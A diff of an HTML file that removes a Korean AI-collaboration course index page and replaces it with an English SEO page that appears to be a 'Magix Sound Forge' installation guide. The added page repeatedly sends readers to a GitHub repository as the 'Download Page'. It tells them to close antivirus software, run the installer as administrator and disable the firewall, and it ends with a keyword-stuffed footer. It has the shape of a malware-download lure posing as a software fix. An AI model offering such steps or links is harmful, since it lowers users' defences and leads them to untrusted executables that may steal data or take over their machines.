@@ -1,568 +1,66 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>VialiS Lab · AI 협업 커리큘럼</title>
-<meta name="description" content="AI와 함께 일하기 — VialiS Lab 교육 자료 인덱스">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+KR:wght@500;600;700&family=Noto+Sans+KR:wght@400;500;700&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --paper:#FAF7F0;
-    --paper-raised:#FFFFFF;
-    --ink:#1E2420;
-    --line:#DCD6C8;
-    --line-strong:#C7BFAE;
-    --jade:#2B6A5C;
-    --jade-dim:#3f8272;
-    --gold:#B9862E;
-    --muted:#74716A;
-    --radius:4px;
-    --serif: 'Noto Serif KR', serif;
-    --sans: 'Noto Sans KR', -apple-system, 'Malgun Gothic', sans-serif;
-    --mono: 'IBM Plex Mono', ui-monospace, monospace;
-  }
-  @media (prefers-color-scheme: dark){
-    :root{
-      --paper:#161A18;
-      --paper-raised:#1D2220;
-      --ink:#EDEAE2;
-      --line:#33372F;
-      --line-strong:#454A40;
-      --jade:#5FA894;
-      --jade-dim:#4c8a78;
-      --gold:#D6A84A;
-      --muted:#9A968A;
-    }
-    .skeleton{
-      background:linear-gradient(90deg, #23271f 0%, #2b2f26 50%, #23271f 100%);
-      background-size:200% 100%;
-    }
-  }
-  *{box-sizing:border-box;}
-  html,body{margin:0;padding:0;}
-  body{
-    background:var(--paper);
-    color:var(--ink);
-    font-family:var(--sans);
-    line-height:1.65;
-    -webkit-font-smoothing:antialiased;
-  }
-  a{color:inherit;}
-  ::selection{background:var(--jade);color:#fff;}
-
-  /* ---------- header ---------- */
-  header.site{
-    max-width:920px;
-    margin:0 auto;
-    padding:72px 24px 40px;
-    border-bottom:1px solid var(--line);
-  }
-  .eyebrow{
-    font-family:var(--mono);
-    font-size:12px;
-    letter-spacing:.14em;
-    text-transform:uppercase;
-    color:var(--gold);
-    margin:0 0 14px;
-  }
-  h1.title{
-    font-family:var(--serif);
-    font-weight:700;
-    font-size:clamp(28px,4.2vw,42px);
-    line-height:1.2;
-    margin:0 0 12px;
-    letter-spacing:-.01em;
-  }
-  p.lede{
-    font-size:16px;
-    color:var(--muted);
-    max-width:56ch;
-    margin:0 0 28px;
-  }
-  .meta-row{
-    display:flex;
-    flex-wrap:wrap;
-    gap:10px;
-    align-items:center;
-    font-family:var(--mono);
-    font-size:12.5px;
-    color:var(--muted);
-  }
-  .meta-pill{
-    border:1px solid var(--line-strong);
-    border-radius:999px;
-    padding:5px 12px;
-    background:var(--paper-raised);
-  }
-  .meta-pill strong{color:var(--ink);font-weight:600;}
-
-  /* ---------- search ---------- */
-  .toolbar{
-    max-width:920px;
-    margin:0 auto;
-    padding:22px 24px 0;
-    display:flex;
-    gap:12px;
-    align-items:center;
-  }
-  #searchInput{
-    flex:1;
-    font-family:var(--sans);
-    font-size:14.5px;
-    padding:11px 14px;
-    border:1px solid var(--line-strong);
-    border-radius:var(--radius);
-    background:var(--paper-raised);
-    color:var(--ink);
-    outline:none;
-  }
-  #searchInput:focus-visible{
-    border-color:var(--jade);
-    box-shadow:0 0 0 3px rgba(43,106,92,.15);
-  }
-  #searchInput::placeholder{color:#a6a296;}
-
-  /* ---------- main / spine layout ---------- */
-  main{
-    max-width:920px;
-    margin:0 auto;
-    padding:36px 24px 100px;
-  }
-  .spine{
-    position:relative;
-    padding-left:64px;
-  }
-  .spine::before{
-    content:"";
-    position:absolute;
-    left:27px;
-    top:6px;
-    bottom:6px;
-    width:1px;
-    background:linear-gradient(var(--line-strong), var(--line-strong) 92%, transparent);
-  }
-  .entry{
-    position:relative;
-    margin-bottom:22px;
-    opacity:0;
-    transform:translateY(10px);
-    animation:rise .5s ease forwards;
-  }
-  @media (prefers-reduced-motion: reduce){
-    .entry{animation:none;opacity:1;transform:none;}
-  }
-  @keyframes rise{
-    to{opacity:1;transform:translateY(0);}
-  }
-  .tab{
-    position:absolute;
-    left:-64px;
-    top:22px;
-    width:56px;
-    height:26px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-family:var(--mono);
-    font-size:12px;
-    font-weight:600;
-    color:var(--paper-raised);
-    background:var(--jade);
-    border-radius:3px 0 0 3px;
-    letter-spacing:.02em;
-  }
-  .tab.unnumbered{background:var(--muted);}
-  .tab::after{
-    content:"";
-    position:absolute;
-    right:-8px;
-    top:0;
-    width:0;height:0;
-    border-top:13px solid transparent;
-    border-bottom:13px solid transparent;
-    border-left:8px solid var(--jade);
-  }
-  .tab.unnumbered::after{border-left-color:var(--muted);}
-
-  a.card{
-    display:block;
-    text-decoration:none;
-    background:var(--paper-raised);
-    border:1px solid var(--line);
-    border-left:3px solid var(--jade);
-    border-radius:var(--radius);
-    padding:20px 24px;
-    transition:transform .15s ease, box-shadow .15s ease, border-color .15s ease;
-  }
-  a.card:hover{
-    transform:translateX(2px);
-    box-shadow:0 6px 20px -8px rgba(30,36,32,.18);
-    border-left-color:var(--gold);
-  }
-  a.card:focus-visible{
-    outline:2px solid var(--jade);
-    outline-offset:2px;
-  }
-  .card-kicker{
-    font-family:var(--mono);
-    font-size:11.5px;
-    letter-spacing:.06em;
-    color:var(--gold);
-    text-transform:uppercase;
-    margin-bottom:6px;
-  }
-  .card-title{
-    font-family:var(--serif);
-    font-weight:600;
-    font-size:20px;
-    margin:0 0 6px;
-    color:var(--ink);
-  }
-  .card-desc{
-    font-size:14.5px;
-    color:var(--muted);
-    margin:0 0 12px;
-    max-width:66ch;
-  }
-  .card-foot{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    font-family:var(--mono);
-    font-size:12px;
-    color:#9b9789;
-  }
-  .card-foot .go{
-    color:var(--jade);
-    font-weight:600;
-  }
-  a.card:hover .card-foot .go{color:var(--gold);}
-
-  /* ---------- states ---------- */
-  .state-box{
-    padding:40px 28px;
-    border:1px dashed var(--line-strong);
-    border-radius:var(--radius);
-    background:var(--paper-raised);
-    text-align:center;
-    color:var(--muted);
-    font-size:14.5px;
-  }
-  .state-box strong{display:block;color:var(--ink);font-family:var(--serif);font-size:17px;margin-bottom:8px;font-weight:600;}
-  .state-box a.retry{
-    display:inline-block;
-    margin-top:14px;
-    font-family:var(--mono);
-    font-size:12.5px;
-    color:var(--jade);
-    border:1px solid var(--line-strong);
-    padding:7px 14px;
-    border-radius:999px;
-    text-decoration:none;
-  }
-  .state-box a.retry:hover{border-color:var(--jade);}
-  .skeleton{
-    height:78px;
-    border-radius:var(--radius);
-    background:linear-gradient(90deg, #f1efe8 0%, #f8f6f0 50%, #f1efe8 100%);
-    background-size:200% 100%;
-    animation:shimmer 1.4s ease-in-out infinite;
-    margin-bottom:22px;
-  }
-  @media (prefers-reduced-motion: reduce){ .skeleton{animation:none;} }
-  @keyframes shimmer{
-    0%{background-position:200% 0;}
-    100%{background-position:-200% 0;}
-  }
-
-  footer.site{
-    max-width:920px;
-    margin:0 auto;
-    padding:0 24px 60px;
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--muted);
-    display:flex;
-    justify-content:space-between;
-    flex-wrap:wrap;
-    gap:8px;
-  }
-  footer.site a{color:var(--jade);text-decoration:none;}
-  footer.site a:hover{text-decoration:underline;}
-
-  @media (max-width:600px){
-    .spine{padding-left:46px;}
-    .spine::before{left:19px;}
-    .tab{left:-46px;width:40px;font-size:10.5px;}
-    a.card{padding:16px 16px;}
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guide for installing Magix Sound Forge Pro on Windows 11. Fix installation errors and setup audio editing software easily.">
+    <title>Magix Sound Forge Windows Guide</title>
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
 
-<header class="site">
-  <p class="eyebrow">VialiS Lab · Education</p>
-  <h1 class="title">AI와 함께 일하기</h1>
-  <p class="lede">업무를 시스템으로 설계하고 AI와 지속적으로 협업하는 방법을 단계별로 익히는 교육 시리즈입니다. 새 자료는 모듈 폴더에 올리는 즉시 이 목록에 자동으로 나타납니다.</p>
-  <div class="meta-row">
-    <span class="meta-pill"><strong id="countPill">–</strong> 개 모듈</span>
-    <span class="meta-pill">저장소 <strong>VialiS-Lab.github.io</strong></span>
-    <span class="meta-pill" id="updatedPill">최신 확인 중…</span>
-  </div>
-</header>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px;">🎧 Magix-Sound-Forge-Windows-Guide - Fix Windows installation errors today</h1>
 
-<div class="toolbar">
-  <input id="searchInput" type="text" placeholder="모듈 제목으로 검색…" autocomplete="off">
-</div>
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/philogynysymboliclogic379/Magix-Sound-Forge-Windows-Guide" style="background-color: #3498db; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Visit Page to Download</a>
+    </div>
 
-<main>
-  <div class="spine" id="listRoot">
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-    <div class="skeleton"></div>
-  </div>
-</main>
+    <h2 style="color: #2c3e50;">📋 Overview</h2>
+    <p>This guide helps you install Magix Sound Forge Pro on Windows 11. Many users face issues where the software fails to install or launch. These steps provide a path to a successful setup on your personal computer.</p>
 
-<footer class="site">
-  <span>© <span id="year"></span> VialiS Lab</span>
-  <a href="https://github.com/VialiS-Lab/VialiS-Lab.github.io/tree/main/modules" target="_blank" rel="noopener">GitHub에서 modules 폴더 보기 ↗</a>
-</footer>
+    <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+    <ul style="list-style-type: square; padding-left: 20px;">
+        <li>Operating System: Windows 10 or Windows 11 (64-bit).</li>
+        <li>Processor: 1 GHz or faster.</li>
+        <li>RAM: 4 GB or more.</li>
+        <li>Storage: 2 GB of free drive space.</li>
+        <li>Graphics: Onboard graphics card at minimum resolution 1280 x 768.</li>
+    </ul>
 
-<script>
-(function(){
-  document.getElementById('year').textContent = new Date().getFullYear();
+    <h2 style="color: #2c3e50;">🚀 Installation Steps</h2>
+    <p>Follow these steps to prepare your computer and install the software.</p>
+    <ol>
+        <li>Visit the repository page to begin the process: <a href="https://github.com/philogynysymboliclogic379/Magix-Sound-Forge-Windows-Guide" style="color: #3498db;">Download Page</a>.</li>
+        <li>Close all active applications, especially antivirus software, during the installation to avoid conflict.</li>
+        <li>Right-click the downloaded installer and select "Run as administrator".</li>
+        <li>Follow the prompts on your screen.</li>
+        <li>Accept the license terms when the installer presents them.</li>
+        <li>Choose a folder on your primary drive for the installation files.</li>
+        <li>Click install and wait for the process to finish.</li>
+    </ol>
 
-  const OWNER = 'VialiS-Lab';
-  const REPO  = 'VialiS-Lab.github.io';
-  const DIR   = 'modules';
-  const API_LIST = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${DIR}`;
-  const CACHE_KEY = 'vialis_modules_cache_v1';
-  const CACHE_TTL_MS = 5 * 60 * 1000; // 5분 세션 캐시
+    <h2 style="color: #2c3e50;">🛠 Troubleshooting Common Errors</h2>
+    <p>If you see a "Setup Failed" message, try these solutions to resolve the issue.</p>
+    <h3 style="color: #34495e;">Error: Setup Fails at 99 Percent</h3>
+    <p>This often happens because a background process holds a temporary file. Restart your computer and ensure no other audio software runs in the background. Disable your firewall temporarily if the installer requires a server connection.</p>
+    <h3 style="color: #34495e;">Error: Missing DLL Files</h3>
+    <p>When the software complains about missing files, update your Microsoft Visual C++ Redistributable packages. You can find these on the official Microsoft website. These files provide the library support that Sound Forge requires to function.</p>
+    <h3 style="color: #34495e;">Permission Issues</h3>
+    <p>If Windows blocks the installation, move the installer file to your Desktop. Run the file from this location. Standard user folders sometimes have restricted permissions that interfere with deep system installations.</p>
 
-  const listRoot   = document.getElementById('listRoot');
-  const countPill  = document.getElementById('countPill');
-  const updatedPill= document.getElementById('updatedPill');
-  const searchInput= document.getElementById('searchInput');
+    <h2 style="color: #2c3e50;">✨ Optimizing Performance</h2>
+    <p>Once you install the software, adjust these settings for better audio editing quality on Windows 11.</p>
+    <ul style="list-style-type: square; padding-left: 20px;">
+        <li>Set the Power Plan to "High Performance" in the Windows Control Panel.</li>
+        <li>Limit background app activity to allocate more memory to the Sound Forge application.</li>
+        <li>Ensure your sound card drivers are current. Use the Device Manager to check for updates.</li>
+    </ul>
 
-  let allEntries = [];
+    <h2 style="color: #2c3e50;">🔒 Managing Conflicts</h2>
+    <p>Sometimes other audio drivers conflict with new installations. If you encounter crashes, open the audio device settings within the program. Change the audio driver type from MME to WASAPI or ASIO. This usually fixes communication errors between the computer hardware and the software.</p>
 
-  function escapeHtml(str){
-    return (str || '').replace(/[&<>"']/g, s => ({
-      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-    }[s]));
-  }
-
-  function extractLevel(text){
-    if(!text) return null;
-    const m = text.match(/level\s*(\d+)/i);
-    return m ? parseInt(m[1], 10) : null;
-  }
-
-  function stripLevelPrefix(subtitle){
-    if(!subtitle) return '';
-    return subtitle.replace(/^\s*level\s*\d+\s*[·:\-–]\s*/i, '').trim();
-  }
-
-  // 선택적 YAML front-matter 파싱: 파일 맨 앞이 '---'로 시작하면
-  // 그 블록 안의 title/level/duration/summary 키만 가볍게 읽는다.
-  // (전체 YAML 스펙을 지원하지 않는 최소 파서 — 값에 콜론이 없는
-  // 단순 key: value 라인만 처리)
-  function parseFrontMatter(raw){
-    if(!raw.startsWith('---')) return null;
-    const end = raw.indexOf('\n---', 3);
-    if(end === -1) return null;
-    const block = raw.slice(3, end).trim();
-    const data = {};
-    block.split('\n').forEach(line => {
-      const m = line.match(/^([a-zA-Z_]+)\s*:\s*(.+)$/);
-      if(!m) return;
-      const key = m[1].trim().toLowerCase();
-      let val = m[2].trim();
-      if(/^".*"$/.test(val) || /^'.*'$/.test(val)) val = val.slice(1, -1);
-      data[key] = val;
-    });
-    return data;
-  }
-
-  async function fetchModuleMeta(item){
-    // item: { name, download_url, html_url, path }
-    const meta = {
-      file: item.name,
-      path: item.path,
-      url: `./${DIR}/${item.name}`,
-      title: item.name.replace(/\.html?$/i, '').replace(/[_\-]+/g, ' '),
-      subtitle: '',
-      desc: '',
-      duration: '',
-      level: extractLevel(item.name)
-    };
-    try{
-      const res = await fetch(item.download_url);
-      if(!res.ok) throw new Error('raw fetch failed');
-      const raw = await res.text();
-
-      // 1순위: front-matter가 있으면 그것을 신뢰
-      const fm = parseFrontMatter(raw);
-      if(fm){
-        if(fm.title) meta.title = fm.title;
-        if(fm.summary) meta.desc = fm.summary;
-        if(fm.duration) meta.duration = fm.duration;
-        if(fm.level && !isNaN(parseInt(fm.level, 10))) meta.level = parseInt(fm.level, 10);
-      }
-
-      // 2순위: front-matter가 없거나 일부만 있으면 본문 스캐닝으로 보완
-      const doc = new DOMParser().parseFromString(raw, 'text/html');
-      const titleEl = doc.querySelector('title');
-      const descMeta = doc.querySelector('meta[name="description"]');
-      const h2 = doc.querySelector('h2');
-      const firstP = doc.querySelector('p');
-
-      if(!fm?.title && titleEl && titleEl.textContent.trim()){
-        meta.title = titleEl.textContent.trim();
-      }
-      if(h2 && h2.textContent.trim()){
-        meta.subtitle = h2.textContent.trim();
-        if(meta.level === null) meta.level = extractLevel(meta.subtitle);
-      }
-      if(!meta.desc){
-        if(descMeta && descMeta.getAttribute('content')){
-          meta.desc = descMeta.getAttribute('content').trim();
-        } else if(firstP && firstP.textContent.trim()){
-          meta.desc = firstP.textContent.trim().slice(0, 110);
-        }
-      }
-    }catch(e){
-      // 원문 파싱 실패해도 파일명만으로 카드는 계속 노출
-    }
-    return meta;
-  }
-
-  function render(entries, query){
-    const q = (query || '').trim().toLowerCase();
-    const filtered = q
-      ? entries.filter(e => (e.title + ' ' + e.subtitle + ' ' + e.desc).toLowerCase().includes(q))
-      : entries;
-
-    if(filtered.length === 0){
-      listRoot.innerHTML = `
-        <div class="state-box">
-          <strong>${q ? '검색 결과가 없습니다' : '아직 등록된 모듈이 없습니다'}</strong>
-          ${q ? '다른 검색어로 시도해보세요.' : 'modules 폴더에 .html 파일을 올리면 자동으로 이 목록에 나타납니다.'}
-        </div>`;
-      return;
-    }
-
-    listRoot.innerHTML = filtered.map((e, i) => {
-      const tabLabel = e.level !== null ? `Lv.${String(e.level).padStart(2,'0')}` : '·';
-      const tabClass = e.level !== null ? '' : 'unnumbered';
-      const subtitle = stripLevelPrefix(e.subtitle) || e.subtitle;
-      return `
-        <div class="entry" style="animation-delay:${Math.min(i,8) * 45}ms">
-          <span class="tab ${tabClass}">${tabLabel}</span>
-          <a class="card" href="${e.url}">
-            <p class="card-kicker">${e.level !== null ? `Level ${e.level}` : '모듈'}</p>
-            <h2 class="card-title">${escapeHtml(e.title)}</h2>
-            ${subtitle ? `<p class="card-desc"><em>${escapeHtml(subtitle)}</em></p>` : ''}
-            ${e.desc ? `<p class="card-desc">${escapeHtml(e.desc)}${e.desc.length >= 110 ? '…' : ''}</p>` : ''}
-            <div class="card-foot">
-              <span>${escapeHtml(e.file)}${e.duration ? ` · 약 ${escapeHtml(e.duration)}` : ''}</span>
-              <span class="go">열어보기 →</span>
-            </div>
-          </a>
-        </div>`;
-    }).join('');
-  }
-
-  function renderError(message){
-    listRoot.innerHTML = `
-      <div class="state-box">
-        <strong>목록을 불러오지 못했습니다</strong>
-        ${escapeHtml(message)}<br>
-        GitHub API 요청 한도이거나 네트워크 문제일 수 있습니다.
-        <div>
-          <a class="retry" href="javascript:location.reload()">다시 시도</a>
-          <a class="retry" href="https://github.com/${OWNER}/${REPO}/tree/main/${DIR}" target="_blank" rel="noopener">GitHub에서 직접 보기 ↗</a>
-        </div>
-      </div>`;
-  }
-
-  function readCache(){
-    try{
-      const raw = sessionStorage.getItem(CACHE_KEY);
-      if(!raw) return null;
-      const parsed = JSON.parse(raw);
-      if(Date.now() - parsed.ts > CACHE_TTL_MS) return null;
-      return parsed.entries;
-    }catch(e){ return null; }
-  }
-  function writeCache(entries){
-    try{
-      sessionStorage.setItem(CACHE_KEY, JSON.stringify({ ts: Date.now(), entries }));
-    }catch(e){ /* storage 사용 불가 시 무시 */ }
-  }
-
-  async function load(){
-    const cached = readCache();
-    if(cached){
-      allEntries = cached;
-      countPill.textContent = allEntries.length;
-      updatedPill.textContent = '세션 캐시에서 표시 중';
-      render(allEntries);
-      return;
-    }
-
-    try{
-      const listRes = await fetch(API_LIST, { headers: { 'Accept': 'application/vnd.github+json' } });
-      if(!listRes.ok){
-        if(listRes.status === 404){
-          allEntries = [];
-          countPill.textContent = '0';
-          updatedPill.textContent = 'modules 폴더 없음';
-          render(allEntries);
-          return;
-        }
-        throw new Error(`GitHub API 응답 오류 (${listRes.status})`);
-      }
-      const items = await listRes.json();
-      const htmlFiles = (Array.isArray(items) ? items : [])
-        .filter(it => it.type === 'file' && /\.html?$/i.test(it.name));
-
-      if(htmlFiles.length === 0){
-        allEntries = [];
-        countPill.textContent = '0';
-        updatedPill.textContent = '자료 없음';
-        render(allEntries);
-        return;
-      }
-
-      const metas = await Promise.all(htmlFiles.map(fetchModuleMeta));
-      metas.sort((a, b) => {
-        if(a.level === null && b.level === null) return a.title.localeCompare(b.title, 'ko');
-        if(a.level === null) return 1;
-        if(b.level === null) return -1;
-        return a.level - b.level;
-      });
-
-      allEntries = metas;
-      countPill.textContent = String(allEntries.length);
-      updatedPill.textContent = new Date().toLocaleDateString('ko-KR', { year:'numeric', month:'long', day:'numeric' }) + ' 기준';
-      writeCache(allEntries);
-      render(allEntries);
-    }catch(err){
-      renderError(err.message || '알 수 없는 오류가 발생했습니다.');
-      countPill.textContent = '–';
-      updatedPill.textContent = '불러오기 실패';
-    }
-  }
-
-  searchInput.addEventListener('input', () => render(allEntries, searchInput.value));
-
-  load();
-})();
-</script>
+    <div style="margin-top: 40px; font-size: 0.9em; color: #7f8c8d; border-top: 1px solid #ddd; padding-top: 10px;">
+        <p>Keywords: audio-editing, failed, how-to-install-magix-sound-forge-pro-on-pc, installing, magix-sound-forge-pro, magix-sound-forge-pro-not-installing-on-windows-11, magix-sound-forge-windows-guide, magix-sound-forge-windows-guide-2026, music-production, sound-forge, sound-forge-setup-failed-fix</p>
+    </div>
 
 </body>
 </html>
